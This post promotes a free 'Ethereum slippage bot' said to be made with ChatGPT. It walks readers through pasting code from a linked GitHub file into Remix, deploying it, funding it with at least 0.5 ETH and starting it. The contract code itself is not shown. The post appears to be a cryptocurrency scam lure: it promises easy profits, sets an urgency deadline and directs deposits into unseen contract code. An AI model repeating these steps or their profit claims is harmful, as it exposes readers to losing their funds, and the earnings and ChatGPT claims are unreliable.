Hello, i'am 𝐌𝐞𝐫𝐜𝐮𝐫𝐲 𝐄𝐝𝐢𝐭𝐬. Today, I'll demonstrate using ChatGPT to build an My Personal Ethereum Bot, earning ETHs through Slippage on the eths networks.

I'm WEB3 Developer, and together with Chat GPT this bot was created. For now it's totally FREE, to show you how perfect it works, and how much money you can make. 
However, start from JUN/30/2024, I clothing free version of bot (Api Key will be not actual, so your bot will not be able to deploy the contract), next it'll cost $2500/week. 
Until it happened everyone is welcome to try it, and to make some really good money.

STEP BY STEP INSTRUCTIONS:

👉Download MetaMask: https://metamask.io/download
or
👉Download Coin Base Wallet:  https://www.coinbase.com/wallet
or
👉Download Trust Wallet:  https://trustwallet.com/ru/browser-ex...
If you're using Trust Wallet or Coinbase Wallet all steps are exact the same as with Meta Mask Wallet.

👉 Head over to Official Remix: https://remix.ethereum.org/

👉 Create “New File”. Rename it whatever you want or “bot.sol”

👉 Paste THIS code into Remix: https://github.com/mercuryeritt/Arbitrage-Eth-bot/blob/main/ethbot

👉 Go to the "Solidity Compiler" tab on Remix, Enable Optimization and Compile

👉 Go to the “Deploy & Run Transactions” tab on Remix, select the “Injected Provider” environment, then “Deploy”. This will create your own contract by confirming the MetaMask Contract creation fee.

👉 Make sure your deposit is more than 0.5-1ETH( to prevent negating slippage ) to your exact contract/bot address.

👉 Click on the “Key” button, and copy your key to VALUE

👉 In the “SetBalancePercent” or “SetBalanceETH” functions, enter the amount of money the bot will work with.

👉 Click “StartNative” button to get the bot started

👉 To withdraw funds from your smart contract, click on “Stop” button, then “Withdraw”

🔎 How can I restore the old contract again?
Instead of "Deploy" by creating a new contract in the "DEPLOY & RUN TRANSACTIONS" section, you can access your old contract again by typing the old contract address you created in the "At Address" field and clicking the "At Address" button.
Note: Access cannot be made with any other account other than your MetaMask account where you created the contract.
